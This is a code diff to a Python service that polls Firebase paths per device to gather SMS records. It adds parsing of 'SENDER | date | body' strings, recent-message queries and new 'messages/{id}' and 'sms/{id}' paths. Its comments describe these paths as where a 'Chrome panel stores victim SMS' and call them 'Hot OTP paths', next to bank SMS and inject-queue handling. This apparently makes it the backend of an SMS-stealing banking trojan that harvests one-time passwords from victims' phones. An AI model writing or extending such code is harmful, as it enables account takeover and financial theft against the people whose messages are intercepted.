@@ -80,6 +80,7 @@ SINGLETON_SMS_SUFFIXES = (
 TIME_FIELDS = (
     "time",
     "date",
+    "dateTime",
     "timestamp",
     "ts",
     "received_at",
@@ -89,6 +90,8 @@ TIME_FIELDS = (
     "receivedDate",
     "createdDate",
 )
+RECENT_MESSAGES_LIMIT = 8
+_MESSAGES_DEVICE_PATH_RE = re.compile(r"^messages/[^/]+$")
 SEEN_META_KEY = "firebase_sms_seen"
 BASELINE_META_KEY = "firebase_sms_baseline"
 BASELINE_AT_META_KEY = "firebase_sms_baseline_at"
@@ -286,6 +289,8 @@ def _record_dedup_key(record: dict[str, Any]) -> str:
 def _is_sms_list_path(firebase_key: str) -> bool:
     """Push-id SMS under sms/SMS/bank/messages — use seen-set, not timestamp."""
     key = (firebase_key or "").lower()
+    if key.startswith("messages/"):
+        return True
     return any(
         token in key
         for token in (
@@ -441,6 +446,19 @@ def _is_poll_noise_record(sender: str, message: str) -> bool:
     return False
 
 
+def _parse_panel_sms_string(text: str) -> tuple[str, str]:
+    """Chrome panel sometimes stores SMS as 'SENDER | date | body'."""
+    raw = (text or "").strip()
+    if not raw:
+        return "Unknown", raw
+    parts = [part.strip() for part in raw.split("|")]
+    if len(parts) >= 3 and re.match(r"^[A-Z0-9-]{3,}$", parts[0], re.I):
+        sender = parts[0]
+        body = "|".join(parts[2:]).strip() if len(parts) > 2 else parts[-1]
+        return sender, body or raw
+    return "Unknown", raw
+
+
 def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
     if not isinstance(value, dict):
         return None
@@ -448,6 +466,9 @@ def _parse_sms_entry(firebase_key: str, value: Any) -> dict[str, Any] | None:
     if _is_inject_queue_entry(value):
         return None
     if _is_channel_outgoing_webhook(value):
+        return None
+    msg_type = str(value.get("type") or "").strip().lower()
+    if msg_type == "outgoing":
         return None
 
     sender = _first_field(value, SENDER_FIELDS)
@@ -570,11 +591,42 @@ def _extract_sms_records(path: str, value: Any) -> list[dict[str, Any]]:
             records.extend(_extract_sms_records(child_path, child_val))
         elif isinstance(child_val, list):
             records.extend(_extract_sms_records(child_path, child_val))
+        elif isinstance(child_val, str):
+            text = child_val.strip()
+            if text and not _is_poll_noise_record("Unknown", text):
+                sender, body = _parse_panel_sms_string(text)
+                records.append(
+                    {
+                        "firebase_key": child_path,
+                        "sender": sender,
+                        "message": body,
+                        "received_at": _parse_body_date(text) or _parse_body_date(body),
+                    }
+                )
     return records
 
 
+async def _fetch_messages_shallow_keys(root: str, device_id: str, timeout: float) -> set[str]:
+    """All message push-ids — lightweight baseline for Chrome panel messages/{id}."""
+    url = f"{root}/messages/{device_id}.json?shallow=true"
+    try:
+        data = await _fetch_json(url, timeout=timeout)
+    except httpx.HTTPError:
+        return set()
+    if not isinstance(data, dict):
+        return set()
+    prefix = f"messages/{device_id}"
+    return {f"{prefix}/{key}" for key in data.keys()}
+
+
 async def _fetch_path_records(root: str, path: str, timeout: float) -> list[dict[str, Any]]:
-    url = f"{root}/{path}.json"
+    if _MESSAGES_DEVICE_PATH_RE.match(path):
+        url = (
+            f"{root}/{path}.json"
+            f'?orderBy=%22%24key%22&limitToLast={RECENT_MESSAGES_LIMIT}'
+        )
+    else:
+        url = f"{root}/{path}.json"
     try:
         data = await _fetch_json(url, timeout=timeout)
     except httpx.HTTPError:
@@ -700,22 +752,17 @@ def _dedupe_records(records: list[dict[str, Any]]) -> list[dict[str, Any]]:
 
 
 def _build_otp_sidecar_paths(device: Device) -> list[str]:
-    """Hot OTP paths — full device node + sms list (Chrome panel 150 SMS tab)."""
+    """Hot OTP paths — messages/{id} is where Chrome panel stores victim SMS."""
     sidecar: list[str] = []
     for device_id in _device_ids(device):
         sidecar.extend(
             [
-                f"clients/{device_id}",
+                f"messages/{device_id}",
+                f"sms/{device_id}",
                 f"clients/{device_id}/lastSms",
                 f"clients/{device_id}/otp",
-                f"clients/{device_id}/sms",
-                f"clients/{device_id}/SMS",
-                f"clients/{device_id}/bank",
-                f"clients/{device_id}/bankSms",
-                f"clients/{device_id}/smsList",
                 f"clients/{device_id}/webhookEvent/receiveSms",
                 f"clients/{device_id}/webhookEvent/incomingSms",
-                f"clients/{device_id}/webhookEvent",
             ]
         )
     if device.firebase_key:
@@ -779,6 +826,8 @@ async def fetch_firebase_sms_for_device(
     for device_id in _device_ids(device):
         priority.extend(
             [
+                f"messages/{device_id}",
+                f"sms/{device_id}",
                 f"clients/{device_id}/sms",
                 f"clients/{device_id}/lastSms",
                 f"clients/{device_id}/inbox",
@@ -812,8 +861,12 @@ async def snapshot_firebase_sms_seen(
             db.commit()
         return 0
 
+    root = firebase_root_url(firebase_url)
     previous_seen = get_seen_sms_keys(device) | get_baseline_sms_keys(device)
     keys: set[str] = set()
+    for device_id in _device_ids(device):
+        keys.update(await _fetch_messages_shallow_keys(root, device_id, SNAPSHOT_TIMEOUT_SEC))
+
     ignored = 0
     for record in records:
         fk = _record_dedup_key(record)
